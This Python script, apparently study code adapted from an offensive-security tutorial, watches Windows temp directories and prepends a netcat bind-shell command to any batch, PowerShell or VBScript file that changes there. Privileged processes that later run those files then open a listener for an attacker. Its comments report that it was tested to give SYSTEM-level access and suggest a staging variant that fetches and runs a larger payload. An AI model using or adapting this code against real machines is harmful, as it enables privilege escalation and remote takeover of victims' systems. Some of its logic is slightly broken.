'''
Original file from the literature: http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html
'''
'''
Monitoring both process activity (mainly child process creation) and directory activity in sensitive/temporary file locations is critical to gain insight into 
opportunities for exploitation lent by the system configuration. You are looking for processes that spawn privileged children, and injectable scripts in temporary 
file locations.
'''
'''
This script monitors specified directories for all manner of changes, alerting the user when changes have been recorded. This is the first step towards identifying
temporary scripts that present an opportunity for code injection when used in conjunction with the process monitoring script.

This script also injects files that are modified in monitored directories:
    1. a modification is detected.
    2. the file extension is checked against injectable file extensions (script files basically).
    3. the contents are read and stored.
    4. a marker and an injection is put at the top of the file, with the contents following. (markers are used to avoid double-injections).
    5. the next time the file is executed (hopefully by a process with high privileges) the injection will be run.

This file has been successfully tested to open a listener with NT AUTHORITY/SYSTEM level privileges that can be connected to from the attacker (similar to a bind payload).
The injections can also be modified for a target behind a firewall. An example of this would be a staging script that retrieves and executes a larger payload.
'''
import os
from telnetlib import EC
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001
PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]            # this is the list of directories that we want to monitor for activity

NETCAT = 'C:\\Users\\super\\work\\netcat\\dist\\netcat.exe'     # this is the location of the netcat.exe executable on the target machine
TGT_IP = '192.168.0.39'                                         # this is the IP address of the victim
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'

FILE_TYPES = {                                                  # this is a dictionary of file type: marker + injection --> markers are used so that injections aren't marked as file modifications that lead to code injections
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n",
             f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}

def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:            # if the injection marker is already in the file, don't inject it (a second time)
        return
    
    full_contents = FILE_TYPES[extension][0]                    # adding the marker
    full_contents += FILE_TYPES[extension][1]                   # adding the injection
    full_contents += contents                                   # original file contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)                                  # inject the file
    print('\\o/ Injected Code')

def monitor(path_to_watch):
    h_directory = win32file.CreateFile(                         # acquiring a handle on this directory being monitored
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
        )
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(          # This function call will tell us when a change occurs in the monitored directory
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
            for action, file_name in results:                           # 'results' contains the name of the file that changed and the type of event that occurred
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:                           # if the file has been modified we dump the contents to examine them
                    extension = os.path.splitext(full_filename)[1]      # check the extension of the modified file against possible extensions of script files to inject

                if extension in FILE_TYPES:
                    print(f'[*] Modified {full_filename}')
                    print('[vvv] Dumping contents... ')
                    try:
                        with open(full_filename) as f:
                            contents = f.read()
                        inject_code(full_filename, contents, extension)         # here is where the vulnerable file is injected
                        print(contents)
                        print('[^^^] Dump complete.')
                    except Exception as e:
                        print(f'[!!!] Dump failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except Exception:
            pass

if __name__ == "__main__":
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()

